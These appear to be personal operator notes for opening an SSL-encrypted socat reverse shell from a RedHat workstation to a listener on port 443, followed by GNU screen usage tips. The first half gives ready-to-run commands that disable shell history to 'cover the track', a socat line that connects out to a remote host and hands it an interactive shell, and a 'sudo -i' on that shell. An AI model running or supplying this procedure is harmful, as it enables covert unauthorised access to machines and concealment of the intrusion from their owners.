Before run the reverse shell, run the following command to cover the track in
RedHat workstation:

  # export HISTFILESIZE=O
  # export HISTSIZE=O
  # unset HISTFILE

Generate the server SSL certificate, then pass the server.crt to client:

  root@localhost:~# openssl genrsa -out ./server.key 2048
  root@localhost:~# touch /root/.rnd
  root@localhost:~# openssl req -new -key ./server.key -x509 -days 3650 -out ./server.crt
  Country Name (2 letter code) [AU]:MO
  State or Province Name (full name) [Some-State]:MO
  Locality Name (eg, city) []:MO
  Organization Name (eg, company) [Internet Widgits Pty Ltd]:notexist
  Organizational Unit Name (eg, section) []:notexist
  Common Name (e.g. server FQDN or YOUR name) []:localhost
  Email Address []:notexist@localhost.com

Create a listener in server side:

  # Remember the rows & cols (or get fom PuTTY)
  root@localhost:~# stty size

  # Setup the screen, use the 'Ctrl-b' instead of 'Ctrl-a'
  root@localhost:~# cat ~/.screenrc
  escape ^Bb

  # Create a new session
  root@localhost:~# screen -S workstation
  
  # Setup the server in screen session
  root@localhost:~# script -a
  root@localhost:~# socat file:`tty`,raw,echo=0 \
                    openssl-listen:443,reuseaddr,cert=server.pem,verify=0

Connect from RedHat workstation:

  # socat openssl-connect:$RHOST:$RPORT,cafile=server.crt,verify=0,fork \
          exec:sh,pty,stderr,setsid,sigint,sane                               

Return to the server:

  sh-4.2# stty rows $ROWS cols $COLS
  sh-4.2# sudo -i

Other screen operation:

  - detach from the screen: <Ctrl-b> + 'd'
  - list the sessions: screen -ls
  - scroll up the buffer: <Ctrl-b> + <Esc>, then use <PgUp>/<PgDn>, press <Esc>
    to get back to the end of the scroll buffer. If hit <Enter> and move the
    cursor in the scroll buffer, you can select the text to copy, and hitting
    <Enter> again will copy it. Then you can paste with <Ctrl-b> + ']'.
  - attach to a not detached session: screen -x <session>
  - share the screen: you need to enable MUTLUSER support (Ctrl-b:multiuser on)
    and add the specific user you want to share your session with to the acl
    list (Ctrl-b:acladd user). (*note* maybe happen suid error)
  - copy the buffer: <Ctrl-b> + h: copy the current window; Ctrl-b:hardcopy -h
    <file>: copy the whole buffer.
  - delete detached screen session: screen -X -S <id> quit
